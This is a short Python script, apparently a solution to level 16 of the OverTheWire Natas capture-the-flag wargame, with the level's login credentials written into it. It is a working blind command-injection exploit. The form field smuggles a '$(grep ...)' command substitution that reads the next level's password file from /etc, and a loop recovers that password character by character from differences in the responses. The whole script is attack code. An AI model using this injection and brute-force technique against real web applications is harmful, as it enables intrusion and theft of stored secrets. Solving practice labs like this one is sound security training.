
import requests
from string import ascii_lowercase
from string import ascii_uppercase

chars = ascii_lowercase + ascii_uppercase + "0123456789"
pwd = ""
isDone = False
while not isDone:
    for char in chars:
        searchPattern = '^' + pwd + char
        r = requests.post("http://natas16.natas.labs.overthewire.org/index.php", data={'needle': '$(grep ' + searchPattern + ' /etc/natas_webpass/natas17)whacked'}, auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if b"whacked" not in r.content:
            pwd += char
            print('Character "' + char + '" found')
            break
    else:
        isDone = True
print (pwd)